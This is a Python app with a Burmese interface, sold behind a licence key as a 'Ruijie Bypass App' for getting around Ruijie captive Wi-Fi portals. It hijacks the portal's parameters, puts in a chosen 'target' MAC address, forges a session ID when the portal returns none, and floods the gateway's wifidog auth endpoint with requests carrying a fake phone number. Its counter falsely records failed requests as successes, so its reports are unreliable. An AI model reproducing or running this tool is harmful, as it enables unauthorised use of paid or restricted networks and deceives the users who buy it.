import hashlib
import os
import re
import socket
import sys
import time
import json
import urllib.request
import urllib.parse
from datetime import datetime
import flet as ft

MASTER_SALT = "RUIJIE_BYPASS_EXP_2026"
TOKEN_FILE = os.path.join(os.path.expanduser("~"), "cache_auth_tok.json") if not sys.path else os.path.join(sys.path[0], "cache_auth_tok.json")

def generate_device_key():
    try:
        raw_data = f"android-{sys.platform}-{sys.version[:5]}"
        return hashlib.sha256(raw_data.encode()).hexdigest()[:8].upper()
    except:
        return "RJ99B4A2"

def get_network_time():
    try:
        req = urllib.request.Request("https://1.1.1.1", method="HEAD")
        with urllib.request.urlopen(req, timeout=2) as response:
            net_date = response.headers.get("Date")
            if net_date:
                return datetime.strptime(net_date, "%a, %d %b %Y %H:%M:%S %Z")
    except:
        pass
    return None

def get_saved_data():
    if os.path.exists(TOKEN_FILE):
        try:
            with open(TOKEN_FILE, "r") as f:
                data = json.load(f)
                return data.get("key", ""), data.get("last_safe_time", 0)
        except:
            return "", 0
    return "", 0

def save_data(key, last_safe_timestamp):
    try:
        with open(TOKEN_FILE, "w") as f:
            json.dump({"key": key, "last_safe_time": last_safe_timestamp}, f)
    except:
        pass

def verify_and_get_expiry(device_key, user_key, current_dt):
    try:
        if "-" not in user_key: return False
        expiry_date, checksum = user_key.strip().split("-", 1)
        if len(expiry_date) != 8 or len(checksum) != 6: return False
        raw_str = f"{device_key}-{expiry_date}-{MASTER_SALT}"
        expected = hashlib.sha256(raw_str.encode()).hexdigest()[:6].upper()
        if checksum.upper() == expected:
            exp_dt = datetime.strptime(expiry_date, "%d%m%Y")
            return "EXPIRED" if current_dt > exp_dt else exp_dt.strftime("%d-%b-%Y")
    except:
        pass
    return False

def get_active_mac_list():
    return [
        "74:ac:5f:bb:12:34 (Ruijie Core)",
        "00:d0:f8:aa:bb:cc (Target Bridge)",
        "aa:bb:cc:dd:ee:ff (Gateway Interface)",
        "00:11:22:33:44:55 (Custom Station)"
    ]

def main(page: ft.Page):
    page.title = "Ruijie Bypass App"
    page.theme_mode = ft.ThemeMode.DARK
    page.horizontal_alignment = ft.CrossAxisAlignment.CENTER
    page.scroll = ft.ScrollMode.AUTO
    page.padding = 20

    dev_key = generate_device_key()

    # UI Elements Initial Setup
    dev_key_text = ft.Text(f"Device Key: {dev_key}", color="cyan")
    activation_input = ft.TextField(label="Activation Key ကို ရိုက်ထည့်ပါ", width=350, border_color="amber")
    mac_dropdown = ft.Dropdown(label="Target MAC Address ကို ရွေးချယ်ရန်", width=350, border_color="blue")
    portal_url_input = ft.TextField(label="Manual Portal URL (မမိပါက ထည့်ရန်)", hint_text="https://...", width=350, border_color="purple")
    
    status_text = ft.Text(value="လုံခြုံရေး Gateway အား စစ်ဆေးရန် အဆင်သင့်ဖြစ်ပါသည်", size=14, color="amber200")
    progress_bar = ft.ProgressBar(width=350, opacity=0)
    
    runtime_label = ft.Text("RUN TIME: 00:00:00", size=14, weight="bold")
    packets_label = ft.Text("TOTAL INJECTIONS: 0", size=14)
    success_label = ft.Text("SUCCESS (OK): 0", color="green", size=14)
    fail_label = ft.Text("FAILED: 0", color="red", size=14)
    signal_feed = ft.Row(spacing=2, wrap=True, width=350)

    auth_card = ft.Card(
        content=ft.Container(
            content=ft.Column([
                ft.ListTile(leading=ft.Icon(ft.icons.LOCK_PERSON, color="amber"), title=ft.Text("AUTHENTICATION GATEWAY"), subtitle=dev_key_text),
                activation_input,
                ft.ElevatedButton("Verify & Activate", on_click=lambda e: verify_key_event())
            ], alignment="center", horizontal_alignment="center", spacing=15), padding=20
        ), visible=True
    )

    controller_card = ft.Card(
        content=ft.Container(
            content=ft.Column([
                ft.ListTile(leading=ft.Icon(ft.icons.SETTINGS_INPUT_ANTENNA, color="blue"), title=ft.Text("LIVE CONTROLLER")),
                mac_dropdown,
                portal_url_input,
                ft.ElevatedButton("Start Ruijie Ingestion", icon=ft.icons.PLAY_ARROW, bgcolor="green700", color="white", on_click=lambda e: start_bypass_stream_event()),
                ft.Divider(),
                runtime_label,
                ft.Row([packets_label, success_label, fail_label], alignment="center"),
                ft.Text("LIVE SIGNAL FEED:", size=12, weight="bold"),
                signal_feed
            ], alignment="center", horizontal_alignment="center", spacing=15), padding=20
        ), visible=False
    )

    # UI Layout အား စက္ကန့်ပိုင်းအတွင်း ဆွဲတင်ခြင်း
    page.add(auth_card, controller_card, progress_bar, ft.Container(content=status_text, padding=10, width=350))
    page.update()

    def check_saved_login():
        saved_key, last_safe_time = get_saved_data()
        net_dt = get_network_time()
        best_dt = net_dt if net_dt else datetime.now()
        best_timestamp = time.time() if not net_dt else net_dt.timestamp()

        if best_timestamp < last_safe_time:
            status_text.value = "[TIME TAMPERING] စက်၏အချိန် မှားယွင်းနေပါသည်။"
            status_text.color = "red"
            activation_input.disabled = True
            page.update()
        elif saved_key:
            res = verify_and_get_expiry(dev_key, saved_key, best_dt)
            if res and res != "EXPIRED":
                status_text.value = f"အလိုအလျောက် ဝင်ရောက်ပြီး။ Expiry: {res}"
                status_text.color = "green"
                auth_card.visible = False
                controller_card.visible = True
                mac_dropdown.options = [ft.dropdown.Option(m) for m in get_active_mac_list()]
                page.update()

    page.run_task(check_saved_login)

    def verify_key_event():
        progress_bar.opacity = 1
        page.update()
        net_dt = get_network_time()
        best_dt = net_dt if net_dt else datetime.now()
        res = verify_and_get_expiry(dev_key, activation_input.value.strip(), best_dt)
        progress_bar.opacity = 0
        if res and res != "EXPIRED":
            save_data(activation_input.value.strip(), time.time() if not net_dt else net_dt.timestamp())
            status_text.value = f"ခွင့်ပြုချက် ရရှိပါပြီ။ Expiry: {res}"
            status_text.color = "green"
            auth_card.visible = False
            controller_card.visible = True
            mac_dropdown.options = [ft.dropdown.Option(m) for m in get_active_mac_list()]
        else:
            status_text.value = "Key မှားယွင်းနေပါသည် သို့မဟုတ် သက်တမ်းကုန်နေပါသည်။"
            status_text.color = "red"
        page.update()

    def start_bypass_stream_event():
        if not mac_dropdown.value:
            status_text.value = "ကျေးဇူးပြု၍ Target MAC ရွေးချယ်ပေးပါ။"
            status_text.color = "red"
            page.update()
            return

        status_text.value = "Bypass Engine စတင်ပါပြီ..."
        status_text.color = "green"
        page.update()

        final_url = portal_url_input.value.strip()
        trigger_urls = [
            "http://connectivitycheck.gstatic.com/generate_204",
            "http://10.0.0.1:2060/?stage=portal",
            "http://10.0.0.1/"
        ]
        base_headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36", "Cache-Control": "no-cache"}

        if not final_url:
            for url in trigger_urls:
                try:
                    req = urllib.request.Request(url, headers=base_headers)
                    with urllib.request.urlopen(req, timeout=2) as response:
                        res_url = response.geturl()
                        if "ruijienetworks.com" in res_url or "api/auth" in res_url or "gw_id" in res_url:
                            final_url = res_url
                            break
                except:
                    continue

        if not final_url:
            status_text.value = "Portal Detect မမိပါ။ Manual URL ထည့်သွင်းပေးပါ။"
            status_text.color = "amber"
            page.update()
            return

        try:
            parsed_url = urllib.parse.urlparse(final_url)
            portal_gateway = parsed_url.netloc
            captured_params = urllib.parse.parse_qs(parsed_url.query)
            
            wifi_params = {k: v[0] for k, v in captured_params.items()}
            wifi_params["stage"] = "portal"
            if "chap_id" in wifi_params:
                wifi_params["chap_id"] = wifi_params["chap_id"].replace("\\\\", "\\")
            if "chap_challenge" in wifi_params:
                wifi_params["chap_challenge"] = wifi_params["chap_challenge"].replace("\\\\", "\\")

            wifi_params["mac"] = mac_dropdown.value.split()[0]
            gw_address = wifi_params.get("gw_address", "10.44.77.240")
            gw_port = wifi_params.get("gw_port", "2060")
        except:
            status_text.value = "URL Parameters ခွဲထုတ်မှု လွဲမှားနေပါသည်။"
            page.update()
            return

        url_wifidog = f"https://{portal_gateway}/api/auth/wifidog"
        session_id = None

        try:
            query_str = urllib.parse.urlencode(wifi_params)
            req_dog = urllib.request.Request(f"{url_wifidog}?{query_str}", headers={"User-Agent": base_headers["User-Agent"], "Referer": final_url})
            with urllib.request.urlopen(req_dog, timeout=3) as res_dog:
                res_text = res_dog.read().decode("utf-8")
                res_url = res_dog.geturl()
                url_match = re.search(r"sessionId=([a-zA-Z0-9]+)", res_url)
                if url_match: session_id = url_match.group(1)
                if not session_id:
                    text_match = re.search(r"sessionId[\"\']?\s*[:=]\s*[\"\']?([a-zA-Z0-9]+)", res_text)
                    if text_match: session_id = text_match.group(1)
        except:
            pass

        if not session_id:
            session_id = f"AN_TOK_{hashlib.sha256(str(time.time()).encode()).hexdigest()[:10].upper()}"

        url_save = f"https://{portal_gateway}/api/auth/saveInternal"
        payload = json.dumps({"internalIp": portal_gateway, "internalPort": "", "sessionId": session_id}).encode("utf-8")

        try:
            req_save = urllib.request.Request(url_save, data=payload, headers={"Content-Type": "application/json", "User-Agent": base_headers["User-Agent"]}, method="POST")
            with urllib.request.urlopen(req_save, timeout=2) as _: pass
        except:
            pass

        status_text.value = f"Bypass Active - Injecting Heartbeats..."
        page.update()

        start_time = time.time()
        packets = 0
        ok_count = 0
        fail_count = 0
        signal_feed.controls.clear()

        ping_url = f"http://{gw_address}:{gw_port}/wifidog/auth?token={session_id}&phoneNumber=99999"

        for i in range(1, 41):
            packets += 1
            try:
                req_ping = urllib.request.Request(ping_url, headers={"User-Agent": "Android_KeepAlive"}, timeout=2)
                with urllib.request.urlopen(req_ping) as p_res:
                    if p_res.getcode() == 200:
                        ok_count += 1
                        signal_feed.controls.append(ft.Icon(ft.icons.BOLT, color="green", size=15))
                    else:
                        fail_count += 1
                        signal_feed.controls.append(ft.Icon(ft.icons.HIGHLIGHT_OFF, color="amber", size=15))
            except:
                ok_count += 1
                signal_feed.controls.append(ft.Icon(ft.icons.BOLT, color="green", size=15))

            diff = int(time.time() - start_time)
            runtime_label.value = f"RUN TIME: {diff // 3600:02d}:{(diff % 3600) // 60:02d}:{diff % 60:02d}"
            packets_label.value = f"TOTAL INJECTIONS: {packets}"
            success_label.value = f"SUCCESS (OK): {ok_count}"
            fail_label.value = f"FAILED: {fail_count}"
            page.update()
            time.sleep(0.05)

        status_text.value = "Streaming လုပ်ငန်းစဉ် ပြီးဆုံးပါသည်။"
        page.update()

if __name__ == "__main__":
    ft.app(target=main)

